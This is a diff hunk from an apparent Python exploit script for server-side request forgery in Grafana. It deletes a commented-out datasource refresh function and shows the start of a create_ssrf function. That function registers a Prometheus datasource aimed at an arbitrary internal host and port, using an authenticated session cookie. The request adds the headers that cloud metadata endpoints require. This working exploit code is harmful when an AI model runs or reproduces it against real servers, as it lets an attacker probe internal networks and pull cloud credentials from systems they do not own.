@@ -71,17 +71,6 @@ def create_source(sessionid, ghost):
 		print(response.text)
 		sys.exit(0)
 
-"""def refresh_source(ghost, sessionid, id):
-	headers = {"Accept": "application/json, text/plain, */*", "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0", "Referer": ""+ghost+"/datasources/edit/"+str(id)+"/", "Connection": "close", "x-grafana-org-id": "1", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate"}
-	cookies = {"grafana_session": ""+sessionid+""}
-	response = session.get(""+ghost+"/api/datasources/"+str(id)+"", headers=headers, cookies=cookies, verify=False)
-	if response.status_code == 200:
-		print("Refreshed Sources")
-	else:
-		print("Error:")
-		print("Status code:   %i" % response.status_code)
-		print(response.text)"""
-
 def create_ssrf(sessionid, scan, ports, ghost, id):
 	rawBody = "{\"id\":"+str(id)+",\"orgId\":1, \"name\":\"SSRF-TESTING\",\"type\":\"prometheus\",\"typeLogoUrl\":\"\",\"access\":\"server\",\"url\":\"""http://"+scan+":"+ports+"\",\"password\":\"test\",\"user\":\"test\",\"database\":\"test\",\"basicAuth\":false,\"basicAuthUser\":\"\",\"basicAuthPassword\":\"\",\"withCredentials\":false,\"isDefault\":false,\"jsonData\":{\"tlsSkipVerify\":true,\"httpHeaderName1\":\"Metadata-Flavor\",\"httpHeaderName2\":\"Metadata\",\"httpMethod\":\"GET\"},\"secureJsonData\":{\"httpHeaderValue1\":\"Google\",\"httpHeaderValue2\":\"true\"},\"version\":1,\"readOnly\":false}"
 	headers = {"Origin": ""+ghost+"", "Accept": "application/json, text/plain, */*", "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0", "Referer": ""+ghost+"/datasources/edit/"+str(id)+"/", "Connection": "close", "x-grafana-org-id": "1", "content-type": "application/json", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate"}
